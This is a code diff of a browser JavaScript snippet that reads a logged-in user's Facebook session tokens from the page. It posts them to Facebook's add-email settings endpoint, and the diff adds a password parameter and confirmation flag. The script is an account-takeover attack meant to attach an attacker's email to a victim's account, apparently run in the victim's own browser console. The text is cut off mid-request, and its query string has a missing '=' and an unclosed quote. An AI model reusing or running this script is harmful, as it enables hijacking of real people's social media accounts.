@@ -6,8 +6,9 @@ var fbdtsg = require(["DTSGInitData"]).token;
 var userId = require(["CurrentUserInitialData"]).USER_ID;
 var hsi = require(["SiteData"]).hsi;
 var email = "hotmail";
+var matkhau = "dienmatkhau";
 var url = "https://www.facebook.com/settings/email/add/submit/";
-var data = "cquick_token=AQ7uWrCfehh4EfBV0wk&ctarget=https%3A%2F%2Fwww.facebook.com&cquick=jsc_c_x&jazoest="+jazoest+"&fb_dtsg="+fbdtsg+"&new_email="+email+"&qp_h=&source_added=web_settings&__user="+userId+"&__a=1&__dyn=7xeUmBwjbg7ebwKheC1swgE98nwgU6C7UW3q327E2vzobo1nEhwem0Ko2_CwjE28wgo2WxO0FE5_wEwt81sbzo5-1uwbe2l2Utwwwi8188fo2IwKw9O0RE5a1qw8W1uwa-7U1mUdEGdw46wbS1Lwqo2Yw&__csr=&__req=6&__hs=19276.BP%3ADEFAULT.2.0.0.0.0&dpr=1&__ccg=MODERATE&__rev=1006364963&__s=92jg3t%3Aw2s84x%3A1ezxng&__hsi=7153351302796419703&__comet_req=0&lsd=2BpMqx0OLlLATx7el-UmzA&__aaid=1056199935112502&__spin_r="+spinR+"&__spin_b=trunk&__spin_t=" + spinT;
+var data = "cquick_token=AQ7uWrCfehh4EfBVszU&ctarget=https%3A%2F%2Fwww.facebook.com&cquick=jsc_c_x&jazoest="+jazoest+"&fb_dtsg"+fbdtsg+"&new_email="+email+"&qp_h=&source_added=web_settings&__user="+userId+"&__a=1&__dyn=7xeUmBwjbg7ebwKheC1swgE98nwgU6C7UW3q327E2vzobo1nEhwem0Ko2_CwjE28wgo2WxO0FE5_wEwt81sbzo5-1uwbe2l2Utwwwi8188fo2IwKw9O0RE5a1qw8W1uwa-7U1mUdEGdw46wbS1Lwqo2Yw&__csr=&__req=7&__hs=19276.BP%3ADEFAULT.2.0.0.0.0&dpr=1&__ccg=MODERATE&__rev=1006364963&__s=ui60vp%3Aw2s84x%3Anddvfo&__hsi=7153356899378590147&__comet_req=0&lsd=byKj0EKFQPovW_zVwRJkl7&__aaid=1056199935112502&__spin_r=1006364963&__spin_b=trunk&__spin_t=1665520691&ajax_password="+matkhau+"&confirmed=1;
 fetch(url, {
     method: 'POST',
     body: data,
